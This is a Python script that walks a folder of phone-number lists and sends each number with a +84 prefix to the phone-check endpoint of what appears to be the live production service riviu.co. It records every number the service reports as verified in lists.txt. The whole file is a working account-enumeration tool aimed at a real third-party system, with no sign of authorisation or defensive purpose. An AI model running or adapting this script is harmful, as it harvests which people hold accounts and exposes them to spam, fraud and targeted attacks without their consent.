import requests
import re
import os


def writeFile(phonenumber):
	f = open("lists.txt", "a+")
	f.write(phonenumber+"\n")
	f.close()

target = "https://production-account.riviu.co/v1.0/check/phone"

PhoneFiles = [val for sublist in [[os.path.join(i[0], j) for j in i[2]] for i in os.walk('PhoneLists')] for val in sublist]

for FilePath in PhoneFiles:
	print("File: " + FilePath)
	f = open(FilePath)
	data = f.read().split("\n")
	f.close()

	for phonenumber in data:
		try:
			res = requests.post(target, data={"country_prefix": "+84","phone": "{}".format(phonenumber)})
			if res.json()["data"]["is_phone_verified"]:
				writeFile(phonenumber)
				print("[+]", phonenumber)
			else:
				print("[-]", phonenumber)
		except Exception as e:
			print("[-]", phonenumber, "passed!!!")